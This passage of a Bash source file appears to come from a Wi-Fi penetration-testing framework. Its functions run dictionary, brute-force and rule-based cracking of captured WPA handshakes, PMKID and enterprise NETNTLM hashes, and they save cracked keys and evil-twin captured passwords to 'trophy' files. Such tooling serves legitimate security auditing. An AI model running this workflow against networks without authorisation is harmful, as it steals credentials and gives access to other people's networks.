			if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
				option_counter=$((option_counter + 1))
				bssids_detected_pmkid[${option_counter}]=${item}
			fi
		done
	fi

	local handshake_captured=0
	local pmkid_captured=0

	for targetbssid in "${bssids_detected[@]}"; do
		if [ "${bssid}" = "${targetbssid}" ]; then
			handshake_captured=1
			break
		fi
	done

	if [[ "${3}" = "also_pmkid" ]] && [[ -n "${nets_from_file2}" ]]; then
		for targetbssid in "${bssids_detected_pmkid[@]}"; do
			if [ "${bssid}" = "${targetbssid}" ]; then
				pmkid_captured=1
				break
			fi
		done
	fi

	if [[ "${handshake_captured}" = "1" ]] && [[ "${pmkid_captured}" = "0" ]]; then
		if [[ "${2}" = "showing_msgs_checking" ]]; then
			language_strings "${language}" 322 "yellow"
		fi
		return 0
	elif [[ "${handshake_captured}" = "0" ]] && [[ "${pmkid_captured}" = "1" ]]; then
		if [[ "${2}" = "showing_msgs_capturing" ]] && [[ "${3}" = "also_pmkid" ]]; then
			echo
			language_strings "${language}" 680 "yellow"
		fi
		if [[ "${2}" = "showing_msgs_checking" ]] && [[ "${3}" = "also_pmkid" ]]; then
			echo
			language_strings "${language}" 683 "yellow"
		fi
		return 0
	elif [[ "${handshake_captured}" = "1" ]] && [[ "${pmkid_captured}" = "1" ]]; then
		if [[ "${2}" = "showing_msgs_capturing" ]] && [[ "${3}" = "also_pmkid" ]]; then
			echo
			language_strings "${language}" 681 "yellow"
		fi
		if [[ "${2}" = "showing_msgs_checking" ]] && [[ "${3}" = "also_pmkid" ]]; then
			echo
			language_strings "${language}" 683 "yellow"
		fi
		return 0
	else
		if [[ "${2}" = "showing_msgs_checking" ]] && [[ "${3}" = "only_handshake" ]]; then
			echo
			language_strings "${language}" 323 "red"
			language_strings "${language}" 115 "read"
		fi
		if [[ "${2}" = "showing_msgs_checking" ]] && [[ "${3}" = "also_pmkid" ]]; then
			echo
			language_strings "${language}" 323 "red"
			language_strings "${language}" 115 "read"
		fi
		return 1
	fi
}

#Set the target vars to a bssid selecting them from a capture file which has a Handshake/PMKID
function select_wpa_bssid_target_from_captured_file() {

	debug_print

	get_aircrack_version

	if compare_floats_greater_than "${aircrack_pmkid_version}" "${aircrack_version}"; then
		echo
		language_strings "${language}" 667 "yellow"
		language_strings "${language}" 115 "read"
	fi

	local nets_from_file
	if [ "${2}" = "only_handshake" ]; then
		nets_from_file=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "WPA \([1-9][0-9]? handshake" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')
	else
		nets_from_file=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "WPA \([1-9][0-9]? handshake|handshake, with PMKID" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')
	fi

	echo
	if [ "${nets_from_file}" = "" ]; then
		language_strings "${language}" 216 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	declare -A bssids_detected
	option_counter=0
	for item in ${nets_from_file}; do
		if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
			option_counter=$((option_counter + 1))
			bssids_detected[${option_counter}]=${item}
		fi
	done

	for targetbssid in "${bssids_detected[@]}"; do
		if [ "${bssid}" = "${targetbssid}" ]; then
			language_strings "${language}" 192 "blue"
			ask_yesno 193 "yes"

			if [ "${yesno}" = "y" ]; then
				bssid=${targetbssid}
				return 0
			fi
			break
		fi
	done

	bssid_autoselected=0
	if [ ${option_counter} -gt 1 ]; then
		option_counter=0
		for item in ${nets_from_file}; do
			if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then

				option_counter=$((option_counter + 1))

				if [ ${option_counter} -lt 10 ]; then
					space=" "
				else
					space=""
				fi

				echo -n "${option_counter}.${space}${item}"
			elif [[ ${item} =~ \)$ ]]; then
				echo -en "${item}\r\n"
			else
				echo -en " ${item} "
			fi
		done
		print_hint ${current_menu}

		target_network_on_file=0
		while [[ ! ${target_network_on_file} =~ ^[[:digit:]]+$ ]] || (( target_network_on_file < 1 || target_network_on_file > option_counter )); do
			echo
			language_strings "${language}" 3 "green"
			read -rp "> " target_network_on_file
		done

	else
		target_network_on_file=1
		bssid_autoselected=1
	fi

	bssid=${bssids_detected[${target_network_on_file}]}

	if [ ${bssid_autoselected} -eq 1 ]; then
		language_strings "${language}" 217 "blue"
	fi

	return 0
}

#Validate if given file has a valid enterprise john the ripper format
function validate_enterprise_jtr_file() {

	debug_print

	echo
	readarray -t JTR_LINES_TO_VALIDATE < <(cat "${1}" 2> /dev/null)

	for item in "${JTR_LINES_TO_VALIDATE[@]}"; do
		if [[ ! "${item}" =~ ^.+:\$NETNTLM\$[[:xdigit:]\$]+$ ]]; then
			language_strings "${language}" 607 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
	done

	language_strings "${language}" 608 "blue"
	language_strings "${language}" 115 "read"
	return 0
}

#Validate if given file has a valid pmkid hashcat format
function validate_pmkid_hashcat_file() {

	debug_print

	echo
	readarray -t HASHCAT_LINES_TO_VALIDATE < <(cat "${1}" 2> /dev/null)

	for item in "${HASHCAT_LINES_TO_VALIDATE[@]}"; do
		if [[ ! "${item}" =~ ^WPA\*[0-9]{2}\*[0-9a-fA-F]{32}\*([0-9a-fA-F]{12}\*){2}[0-9a-fA-F]{26,32}\*+.*$ ]]; then
			language_strings "${language}" 676 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
	done

	language_strings "${language}" 675 "blue"
	language_strings "${language}" 115 "read"
	return 0
}

#Validate if given file has a valid enterprise hashcat format
function validate_enterprise_hashcat_file() {

	debug_print

	echo
	readarray -t HASHCAT_LINES_TO_VALIDATE < <(cat "${1}" 2> /dev/null)

	for item in "${HASHCAT_LINES_TO_VALIDATE[@]}"; do
		if [[ ! "${item}" =~ ^(.+)::::(.+):(.+)$ ]]; then
			language_strings "${language}" 601 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
	done

	language_strings "${language}" 602 "blue"
	language_strings "${language}" 115 "read"
	return 0
}

#Validate and ask for the different parameters used in an enterprise asleap dictionary based attack
function enterprise_asleap_dictionary_attack_option() {

	debug_print

	manage_asking_for_challenge_response
	manage_asking_for_dictionary_file

	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"

	echo
	exec_asleap_attack "offline_menu"
	echo
	manage_asleap_pot "offline_menu"
}

#Validate and ask for the different parameters used in an aircrack dictionary based attack
function aircrack_dictionary_attack_option() {

	debug_print

	manage_asking_for_captured_file "personal_handshake" "aircrack"

	if ! select_wpa_bssid_target_from_captured_file "${enteredpath}" "pmkid_allowed"; then
		return
	fi

	manage_asking_for_dictionary_file

	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_aircrack_dictionary_attack
	manage_aircrack_pot
}

#Validate and ask for the different parameters used in an aircrack bruteforce based attack
function aircrack_bruteforce_attack_option() {

	debug_print

	manage_asking_for_captured_file "personal_handshake" "aircrack"

	if ! select_wpa_bssid_target_from_captured_file "${enteredpath}" "pmkid_allowed"; then
		return
	fi

	set_minlength_and_maxlength "personal"

	charset_option=0
	while [[ ! ${charset_option} =~ ^[[:digit:]]+$ ]] || (( charset_option < 1 || charset_option > 11 )); do
		set_charset "aircrack"
	done

	echo
	language_strings "${language}" 209 "blue"
	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_aircrack_bruteforce_attack
	manage_aircrack_pot
}

#Validate and ask for the different parameters used in a john the ripper dictionary based attack
function enterprise_jtr_dictionary_attack_option() {

	debug_print

	manage_asking_for_captured_file "enterprise" "jtr"

	if ! validate_enterprise_jtr_file "${jtrenterpriseenteredpath}"; then
		return
	fi

	manage_asking_for_dictionary_file

	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_jtr_dictionary_attack
	manage_jtr_pot
}

#Validate and ask for the different parameters used in a john the ripper bruteforce based attack
function enterprise_jtr_bruteforce_attack_option() {

	debug_print

	manage_asking_for_captured_file "enterprise" "jtr"

	if ! validate_enterprise_jtr_file "${jtrenterpriseenteredpath}"; then
		return
	fi

	set_minlength_and_maxlength "enterprise"

	charset_option=0
	while [[ ! ${charset_option} =~ ^[[:digit:]]+$ ]] || (( charset_option < 1 || charset_option > 11 )); do
		set_charset "jtr"
	done

	echo
	language_strings "${language}" 209 "blue"
	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_jtr_bruteforce_attack
	manage_jtr_pot
}

#Validate and ask for the different parameters used in a hashcat dictionary based attack
function hashcat_dictionary_attack_option() {

	debug_print

	manage_asking_for_captured_file "${1}" "hashcat"

	if [ "${1}" = "personal_handshake" ]; then
		if ! select_wpa_bssid_target_from_captured_file "${enteredpath}" "only_handshake"; then
			return
		fi

		if ! convert_cap_to_hashcat_format; then
			return
		fi
	elif [ "${1}" = "personal_pmkid" ]; then
		if ! validate_pmkid_hashcat_file "${hashcatpmkidenteredpath}"; then
			return
		fi
	else
		if ! validate_enterprise_hashcat_file "${hashcatenterpriseenteredpath}"; then
			return
		fi
	fi

	manage_asking_for_dictionary_file

	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_hashcat_dictionary_attack "${1}"
	manage_hashcat_pot "${1}"
}

#Validate and ask for the different parameters used in a hashcat bruteforce based attack
function hashcat_bruteforce_attack_option() {

	debug_print

	manage_asking_for_captured_file "${1}" "hashcat"

	if [ "${1}" = "personal_handshake" ]; then
		if ! select_wpa_bssid_target_from_captured_file "${enteredpath}" "only_handshake"; then
			return
		fi

		if ! convert_cap_to_hashcat_format; then
			return
		fi
	elif [ "${1}" = "personal_pmkid" ]; then
		if ! validate_pmkid_hashcat_file "${hashcatpmkidenteredpath}"; then
			return
		fi
	else
		if ! validate_enterprise_hashcat_file "${hashcatenterpriseenteredpath}"; then
			return
		fi
	fi

	set_minlength_and_maxlength "${1}"

	charset_option=0
	while [[ ! ${charset_option} =~ ^[[:digit:]]+$ ]] || (( charset_option < 1 || charset_option > 11 )); do
		set_charset "hashcat"
	done

	echo
	language_strings "${language}" 209 "blue"
	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_hashcat_bruteforce_attack "${1}"
	manage_hashcat_pot "${1}"
}

#Validate and ask for the different parameters used in a hashcat rule based attack
function hashcat_rulebased_attack_option() {

	debug_print

	manage_asking_for_captured_file "${1}" "hashcat"

	if [ "${1}" = "personal_handshake" ]; then
		if ! select_wpa_bssid_target_from_captured_file "${enteredpath}" "only_handshake"; then
			return
		fi

		if ! convert_cap_to_hashcat_format; then
			return
		fi
	elif [ "${1}" = "personal_pmkid" ]; then
		if ! validate_pmkid_hashcat_file "${hashcatpmkidenteredpath}"; then
			return
		fi
	else
		if ! validate_enterprise_hashcat_file "${hashcatenterpriseenteredpath}"; then
			return
		fi
	fi

	manage_asking_for_dictionary_file
	manage_asking_for_rule_file

	echo
	language_strings "${language}" 190 "yellow"
	language_strings "${language}" 115 "read"
	exec_hashcat_rulebased_attack "${1}"
	manage_hashcat_pot "${1}"
}

#Check if the password was decrypted using hashcat and manage to save it on a file
function manage_hashcat_pot() {

	debug_print

	hashcat_output=$(cat "${tmpdir}${hashcat_output_file}")

	pass_decrypted_by_hashcat=0
	if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat3_version}"; then
		local regexp="Status\.+:[[:space:]]Cracked"
		if [[ ${hashcat_output} =~ ${regexp} ]]; then
			pass_decrypted_by_hashcat=1
		else
			if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat_hccapx_version}"; then
				if [[ -f "${tmpdir}${hashcat_pot_tmp}" ]]; then
					pass_decrypted_by_hashcat=1
				fi
			fi
		fi
	else
		local regexp="All hashes have been recovered"
		if [[ ${hashcat_output} =~ ${regexp} ]]; then
			pass_decrypted_by_hashcat=1
		fi
	fi

	if [ "${pass_decrypted_by_hashcat}" -eq 1 ]; then

		echo
		language_strings "${language}" 234 "yellow"
		ask_yesno 235 "yes"
		if [ "${yesno}" = "y" ]; then
			hashcat_potpath="${default_save_path}"

			local multiple_users=0
			if [ "${1}" = "personal_handshake" ]; then
				hashcatpot_filename="hashcat-${bssid}.txt"
				[[ $(cat "${tmpdir}${hashcat_pot_tmp}") =~ .+:(.+)$ ]] && hashcat_key="${BASH_REMATCH[1]}"
			elif [ "${1}" = "personal_pmkid" ]; then
				hashcatpot_filename="hashcat-pmkid.txt"
				[[ $(cat "${tmpdir}${hashcat_pot_tmp}") =~ .+:(.+)$ ]] && hashcat_key="${BASH_REMATCH[1]}"
			else
				if [[ $(wc -l "${tmpdir}${hashcat_pot_tmp}" 2> /dev/null | awk '{print $1}') -gt 1 ]]; then
					multiple_users=1
					hashcatpot_filename="hashcat-enterprise_user-multiple_users.txt"
					local enterprise_users=()
					local hashcat_keys=()
					readarray -t DECRYPTED_MULTIPLE_USER_PASS < <(uniq "${tmpdir}${hashcat_pot_tmp}" | sort 2> /dev/null)
					for item in "${DECRYPTED_MULTIPLE_USER_PASS[@]}"; do
						[[ "${item}" =~ ^([^:]+:?[^:]+) ]] && enterprise_users+=("${BASH_REMATCH[1]}")
						[[ "${item}" =~ .+:(.+)$ ]] && hashcat_keys+=("${BASH_REMATCH[1]}")
					done
				else
					local enterprise_user
					[[ $(cat "${hashcatenterpriseenteredpath}") =~ ^([^:]+:?[^:]+) ]] && enterprise_user="${BASH_REMATCH[1]}"
					hashcatpot_filename="hashcat-enterprise_user-${enterprise_user}.txt"
					[[ $(cat "${tmpdir}${hashcat_pot_tmp}") =~ .+:(.+)$ ]] && hashcat_key="${BASH_REMATCH[1]}"
				fi
			fi
			hashcat_potpath="${hashcat_potpath}${hashcatpot_filename}"

			validpath=1
			while [[ "${validpath}" != "0" ]]; do
				read_path "hashcatpot"
			done

			{
			echo ""
			date +%Y-%m-%d
			echo "${hashcat_texts[${language},1]}"
			echo ""
			} >> "${potenteredpath}"

			if [ "${1}" = "personal_handshake" ]; then
				{
				echo "BSSID: ${bssid}"
				} >> "${potenteredpath}"
			elif [ "${1}" = "personal_pmkid" ]; then
				{
				echo "${hashcat_texts[${language},0]}:"
				} >> "${potenteredpath}"
			elif [ "${1}" = "enterprise" ]; then
				if [ "${multiple_users}" -eq 1 ]; then
					{
					echo "${hashcat_texts[${language},3]}:"
					} >> "${potenteredpath}"
				else
					{
					echo "${hashcat_texts[${language},2]}: ${enterprise_user}"
					} >> "${potenteredpath}"
				fi
			fi

			if [ "${multiple_users}" -eq 1 ]; then
				{
				echo ""
				echo "---------------"
				echo ""
				} >> "${potenteredpath}"

				for (( x=0; x<${#enterprise_users[@]}; x++ )); do
					{
					echo "${enterprise_users[${x}]} / ${hashcat_keys[${x}]}"
					} >> "${potenteredpath}"
				done
			else
				{
				echo ""
				echo "---------------"
				echo ""
				echo "${hashcat_key}"
				} >> "${potenteredpath}"
			fi

			add_contributing_footer_to_file "${potenteredpath}"

			echo
			language_strings "${language}" 236 "blue"
			language_strings "${language}" 115 "read"
		fi
	fi
}

#Check if the password was decrypted using john the ripper and manage to save it on a file
function manage_jtr_pot() {

	debug_print

	jtr_pot=$(cat "${tmpdir}${jtr_pot_tmp}")

	pass_decrypted_by_jtr=0

	if [[ ${jtr_pot} =~ ^\$NETNTLM\$[^:]+:.+$ ]]; then
		pass_decrypted_by_jtr=1
	fi

	if [ "${pass_decrypted_by_jtr}" -eq 1 ]; then

		echo
		language_strings "${language}" 234 "yellow"
		ask_yesno 235 "yes"
		if [ "${yesno}" = "y" ]; then
			jtr_potpath="${default_save_path}"

			local multiple_users=0

			if [[ $(wc -l "${tmpdir}${jtr_pot_tmp}" 2> /dev/null | awk '{print $1}') -gt 1 ]]; then
				multiple_users=1
				jtrpot_filename="jtr-enterprise_user-multiple_users.txt"
				local enterprise_users=()
				local jtr_keys=()
				readarray -t DECRYPTED_MULTIPLE_PASS < <(uniq "${tmpdir}${jtr_pot_tmp}" | sort 2> /dev/null)
				for item in "${DECRYPTED_MULTIPLE_PASS[@]}"; do
					[[ "${item}" =~ ^\$NETNTLM\$[^:]+:(.+)$ ]] && jtr_keys+=("${BASH_REMATCH[1]}")
					[[ $(grep -E "^${BASH_REMATCH[1]}" "${tmpdir}${jtr_output_file}") =~ ^"${BASH_REMATCH[1]}"[[:blank:]]+\((.+)\) ]] && enterprise_users+=("${BASH_REMATCH[1]}")
				done
			else
				local enterprise_user
				[[ $(cat "${jtrenterpriseenteredpath}") =~ ^([^:\$]+:?[^:\$]+) ]] && enterprise_user="${BASH_REMATCH[1]}"
				jtrpot_filename="jtr-enterprise_user-${enterprise_user}.txt"
				[[ "${jtr_pot}" =~ ^\$NETNTLM\$[^:]+:(.+)$ ]] && jtr_key="${BASH_REMATCH[1]}"
			fi
			jtr_potpath="${jtr_potpath}${jtrpot_filename}"

			validpath=1
			while [[ "${validpath}" != "0" ]]; do
				read_path "jtrpot"
			done

			{
			echo ""
			date +%Y-%m-%d
			echo "${jtr_texts[${language},1]}"
			echo ""
			} >> "${jtrpotenteredpath}"

			if [ "${multiple_users}" -eq 1 ]; then
				{
				echo "${jtr_texts[${language},0]}"
				} >> "${jtrpotenteredpath}"
			else
				{
				echo "${jtr_texts[${language},2]}: ${enterprise_user}"
				} >> "${jtrpotenteredpath}"
			fi

			if [ "${multiple_users}" -eq 1 ]; then
				{
				echo ""
				echo "---------------"
				echo ""
				} >> "${jtrpotenteredpath}"

				for (( x=0; x<${#enterprise_users[@]}; x++ )); do
					{
					echo "${enterprise_users[${x}]} / ${jtr_keys[${x}]}"
					} >> "${jtrpotenteredpath}"
				done
			else
				{
				echo ""
				echo "---------------"
				echo ""
				echo "${jtr_key}"
				} >> "${jtrpotenteredpath}"
			fi

			add_contributing_footer_to_file "${jtrpotenteredpath}"

			echo
			language_strings "${language}" 547 "blue"
			language_strings "${language}" 115 "read"
		fi
	fi
}

#Check if the password was decrypted using aircrack and manage to save it on a file
function manage_aircrack_pot() {

	debug_print

	pass_decrypted_by_aircrack=0
	if [ -f "${tmpdir}${aircrack_pot_tmp}" ]; then
		pass_decrypted_by_aircrack=1
	fi

	if [ "${pass_decrypted_by_aircrack}" -eq 1 ]; then

		echo
		language_strings "${language}" 234 "yellow"
		ask_yesno 235 "yes"
		if [ "${yesno}" = "y" ]; then
			aircrack_potpath="${default_save_path}"
			aircrackpot_filename="aircrack-${bssid}.txt"
			aircrack_potpath="${aircrack_potpath}${aircrackpot_filename}"

			validpath=1
			while [[ "${validpath}" != "0" ]]; do
				read_path "aircrackpot"
			done

			aircrack_key=$(cat "${tmpdir}${aircrack_pot_tmp}")
			{
			echo ""
			date +%Y-%m-%d
			echo "${aircrack_texts[${language},0]}"
			echo ""
			echo "BSSID: ${bssid}"
			echo ""
			echo "---------------"
			echo ""
			echo "${aircrack_key}"
			} >> "${aircrackpotenteredpath}"

			add_contributing_footer_to_file "${aircrackpotenteredpath}"

			echo
			language_strings "${language}" 440 "blue"
			language_strings "${language}" 115 "read"
		fi
	fi
}

#Check if the password was decrypted using asleap against challenges and responses
function manage_asleap_pot() {

	debug_print

	asleap_output=$(cat "${tmpdir}${asleap_pot_tmp}")

	if [[ "${asleap_output}" =~ password:[[:blank:]]+(.*) ]]; then

		local asleap_decrypted_password="${BASH_REMATCH[1]}"
		local write_to_file=0

		language_strings "${language}" 234 "yellow"

		if [ "${1}" != "offline_menu" ]; then
			echo
			local write_to_file=1
			asleap_attack_finished=1
			path_to_asleap_trophy="${enterprise_completepath}enterprise_asleap_decrypted_${bssid}_password.txt"
		else
			ask_yesno 235 "yes"
			if [ "${yesno}" = "y" ]; then
				local write_to_file=1
				asleap_potpath="${default_save_path}"
				asleappot_filename="asleap_decrypted_password.txt"
				asleap_potpath="${asleap_potpath}${asleappot_filename}"

				validpath=1
				while [[ "${validpath}" != "0" ]]; do
					read_path "asleappot"
				done

				path_to_asleap_trophy="${asleapenteredpath}"
			fi
		fi

		if [ "${write_to_file}" = "1" ]; then
			rm -rf "${path_to_asleap_trophy}" > /dev/null 2>&1

			{
			echo ""
			date +%Y-%m-%d
			echo "${asleap_texts[${language},1]}"
			echo ""
			} >> "${path_to_asleap_trophy}"

			if [ "${1}" != "offline_menu" ]; then
				{
				echo "ESSID: ${essid}"
				echo "BSSID: ${bssid}"
				} >> "${path_to_asleap_trophy}"
			fi

			{
			echo "${asleap_texts[${language},2]}: ${enterprise_asleap_challenge}"
			echo "${asleap_texts[${language},0]}: ${enterprise_asleap_response}"
			echo ""
			echo "---------------"
			echo ""
			} >> "${path_to_asleap_trophy}"

			if [ "${1}" != "offline_menu" ]; then
				{
				echo "${enterprise_username} / ${asleap_decrypted_password}"
				} >> "${path_to_asleap_trophy}"
			else
				{
				echo "${asleap_decrypted_password}"
				} >> "${path_to_asleap_trophy}"
			fi

			add_contributing_footer_to_file "${path_to_asleap_trophy}"

			language_strings "${language}" 539 "blue"
			language_strings "${language}" 115 "read"
		fi
	else
		if [ "${1}" != "offline_menu" ]; then
			language_strings "${language}" 540 "red"

			ask_yesno 541 "no"
			if [ "${yesno}" = "n" ]; then
				asleap_attack_finished=1
			fi
		fi
	fi
}

#Check if the passwords were captured using ettercap and manage to save them on a file
function manage_ettercap_log() {

	debug_print

	ettercap_log=0
	ask_yesno 302 "yes"
	if [ "${yesno}" = "y" ]; then
		ettercap_log=1
		default_ettercap_logpath="${default_save_path}"
		default_ettercaplogfilename="evil_twin_captured_passwords-${essid}.txt"
		rm -rf "${tmpdir}${ettercap_file}"* > /dev/null 2>&1
		tmp_ettercaplog="${tmpdir}${ettercap_file}"
		default_ettercap_logpath="${default_ettercap_logpath}${default_ettercaplogfilename}"
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "ettercaplog"
		done
	fi
}

#Check if the passwords were captured using bettercap and manage to save them on a file
function manage_bettercap_log() {

	debug_print

	bettercap_log=0
	ask_yesno 302 "yes"
	if [ "${yesno}" = "y" ]; then
		bettercap_log=1
		default_bettercap_logpath="${default_save_path}"
		default_bettercaplogfilename="evil_twin_captured_passwords-bettercap-${essid}.txt"
		rm -rf "${tmpdir}${bettercap_file}"* > /dev/null 2>&1
		tmp_bettercaplog="${tmpdir}${bettercap_file}"
		default_bettercap_logpath="${default_bettercap_logpath}${default_bettercaplogfilename}"
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "bettercaplog"
		done
	fi
}

#Check if the passwords were captured using wps attacks and manage to save them on a file
function manage_wps_log() {

	debug_print

	wps_potpath="${default_save_path}"

	if [ -z "${wps_essid}" ]; then
		wpspot_filename="wps_captured_key-${wps_bssid}.txt"
	else
		wpspot_filename="wps_captured_key-${wps_essid}.txt"
	fi
	wps_potpath="${wps_potpath}${wpspot_filename}"

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "wpspot"
	done
}

#Check if the password was captured using wep all-in-one attack and manage to save it on a file
function manage_wep_log() {

	debug_print

	wep_potpath="${default_save_path}"
	weppot_filename="wep_captured_key-${essid}.txt"
	wep_potpath="${wep_potpath}${weppot_filename}"

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "weppot"
	done
}

#Check if a hash or a password was captured using Evil Twin Enterprise attack and manage to save it on a directory
function manage_enterprise_log() {

	debug_print

	enterprise_potpath="${default_save_path}"
	enterprisepot_suggested_dirname="enterprise_captured-${essid}"
	enterprise_potpath="${enterprise_potpath}${enterprisepot_suggested_dirname}/"

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "enterprisepot"
	done
}

#Check to save certs for Evil Twin Enterprise attack
function manage_enterprise_certs() {

	debug_print

	enterprisecertspath="${default_save_path}"
	enterprisecerts_suggested_dirname="enterprise_certs"
	enterprisecertspath="${enterprisecertspath}${enterprisecerts_suggested_dirname}/"

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "certificates"
	done
}

#Save created cert files to user's location
function save_enterprise_certs() {

	debug_print

	if [ ! -d "${enterprisecerts_completepath}" ]; then
		mkdir -p "${enterprisecerts_completepath}" > /dev/null 2>&1
	fi

	cp "${tmpdir}${certsdir}server.pem" "${enterprisecerts_completepath}" 2> /dev/null
	cp "${tmpdir}${certsdir}ca.pem" "${enterprisecerts_completepath}" 2> /dev/null
	cp "${tmpdir}${certsdir}server.key" "${enterprisecerts_completepath}" 2> /dev/null

	echo
	language_strings "${language}" 644 "blue"
	language_strings "${language}" 115 "read"
}

#Check if the passwords were captured using the captive portal Evil Twin attack and manage to save them on a file
function manage_captive_portal_log() {

	debug_print

	default_et_captive_portal_logpath="${default_save_path}"
	default_et_captive_portallogfilename="evil_twin_captive_portal_password-${essid}.txt"
	default_et_captive_portal_logpath="${default_et_captive_portal_logpath}${default_et_captive_portallogfilename}"
	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "et_captive_portallog"
	done
}

#Handle enterprise log captures
function handle_enterprise_log() {

	debug_print

	if [ -f "${tmpdir}${enterprisedir}${enterprise_successfile}" ]; then

		enterprise_attack_result_code=$(cat < "${tmpdir}${enterprisedir}${enterprise_successfile}" 2> /dev/null)
		echo
		if [ "${enterprise_attack_result_code}" -eq 0 ]; then
			language_strings "${language}" 530 "yellow"
			parse_from_enterprise "hashes"
		elif [ "${enterprise_attack_result_code}" -eq 1 ]; then
			language_strings "${language}" 531 "yellow"
			parse_from_enterprise "passwords"
		elif [ "${enterprise_attack_result_code}" -eq 2 ]; then
			language_strings "${language}" 532 "yellow"
			parse_from_enterprise "both"
		fi

		echo
		language_strings "${language}" 533 "blue"
		language_strings "${language}" 115 "read"
	else
		echo
		language_strings "${language}" 529 "red"
		language_strings "${language}" 115 "read"
	fi
}

#Parse enterprise log to create trophy files
function parse_from_enterprise() {

	debug_print

	local line_number
	local username
	local john_hashes=()
	local hashcat_hashes=()
	local passwords=()
	local line_to_check
	local text_to_check
	unset enterprise_captured_challenges_responses
	declare -gA enterprise_captured_challenges_responses

	readarray -t CAPTURED_USERNAMES < <(grep -n -E "username:" "${tmpdir}${hostapd_wpe_log}" | sort -k 2,3 | uniq --skip-fields=1 2> /dev/null)
	for item in "${CAPTURED_USERNAMES[@]}"; do
		[[ "${item}" =~ ([0-9]+):.*username:[[:blank:]]+(.*) ]] && line_number="${BASH_REMATCH[1]}" && username="${BASH_REMATCH[2]}"
		line_to_check=$((line_number + 1))
		text_to_check=$(sed "${line_to_check}q;d" "${tmpdir}${hostapd_wpe_log}" 2> /dev/null)

		if [[ "${text_to_check}" =~ challenge:[[:blank:]]+(.*) ]]; then
			enterprise_captured_challenges_responses["${username}"]="${BASH_REMATCH[1]}"
			line_to_check=$((line_number + 2))
			text_to_check=$(sed "${line_to_check}q;d" "${tmpdir}${hostapd_wpe_log}" 2> /dev/null)
			[[ "${text_to_check}" =~ response:[[:blank:]]+(.*) ]] && enterprise_captured_challenges_responses["${username}"]+=" / ${BASH_REMATCH[1]}"

			line_to_check=$((line_number + 3))
			text_to_check=$(sed "${line_to_check}q;d" "${tmpdir}${hostapd_wpe_log}" 2> /dev/null)
			[[ "${text_to_check}" =~ jtr[[:blank:]]NETNTLM:[[:blank:]]+(.*) ]] && john_hashes+=("${BASH_REMATCH[1]}")

			line_to_check=$((line_number + 4))
			text_to_check=$(sed "${line_to_check}q;d" "${tmpdir}${hostapd_wpe_log}" 2> /dev/null)
			[[ "${text_to_check}" =~ hashcat[[:blank:]]NETNTLM:[[:blank:]]+(.*) ]] && hashcat_hashes+=("${BASH_REMATCH[1]}")
		fi

		if [[ "${text_to_check}" =~ password:[[:blank:]]+(.*) ]]; then
			passwords+=("${username} / ${BASH_REMATCH[1]}")
		fi
	done

	prepare_enterprise_trophy_dir

	case ${1} in
		"hashes")
			write_enterprise_hashes_file "hashcat" "${hashcat_hashes[@]}"
			write_enterprise_hashes_file "john" "${john_hashes[@]}"
		;;
		"passwords")
			write_enterprise_passwords_file "${passwords[@]}"
		;;
		"both")
			write_enterprise_hashes_file "hashcat" "${hashcat_hashes[@]}"
			write_enterprise_hashes_file "john" "${john_hashes[@]}"
			write_enterprise_passwords_file "${passwords[@]}"
		;;
	esac

	enterprise_username="${username}"
}

#Prepare dir for enterprise trophy files
function prepare_enterprise_trophy_dir() {

	debug_print

	if [ ! -d "${enterprise_completepath}" ]; then
		mkdir -p "${enterprise_completepath}" > /dev/null 2>&1
	fi
}

#Write enterprise captured hashes to trophy file
function write_enterprise_hashes_file() {

	debug_print

	local values=("${@:2}")
	rm -rf "${enterprise_completepath}enterprise_captured_${1}_${bssid}_hashes.txt" > /dev/null 2>&1

	for item in "${values[@]}"; do
		{
		echo "${item}"
		} >> "${enterprise_completepath}enterprise_captured_${1}_${bssid}_hashes.txt"
	done
}

#Write enterprise captured passwords to trophy file
function write_enterprise_passwords_file() {

	debug_print

	local values=("${@:1}")
	rm -rf "${enterprise_completepath}enterprise_captured_${bssid}_passwords.txt" > /dev/null 2>&1

	{
	echo ""
	date +%Y-%m-%d
	echo "${enterprise_texts[${language},11]}"
	echo ""
	echo "ESSID: ${essid}"
	echo "BSSID: ${bssid}"
	echo ""
	echo "---------------"
	echo ""
	} >> "${enterprise_completepath}enterprise_captured_${bssid}_passwords.txt"

	for item in "${values[@]}"; do
		{
		echo "${item}"
		} >> "${enterprise_completepath}enterprise_captured_${bssid}_passwords.txt"
	done

	add_contributing_footer_to_file "${enterprise_completepath}enterprise_captured_${bssid}_passwords.txt"
}

#Captive portal language menu
function set_captive_portal_language() {

	debug_print

	clear
	language_strings "${language}" 293 "title"
	print_iface_selected
	print_et_target_vars
	print_iface_internet_selected
	echo
	language_strings "${language}" 318 "green"
	print_simple_separator
	language_strings "${language}" 266
	print_simple_separator
	language_strings "${language}" 79
	language_strings "${language}" 80
	language_strings "${language}" 113
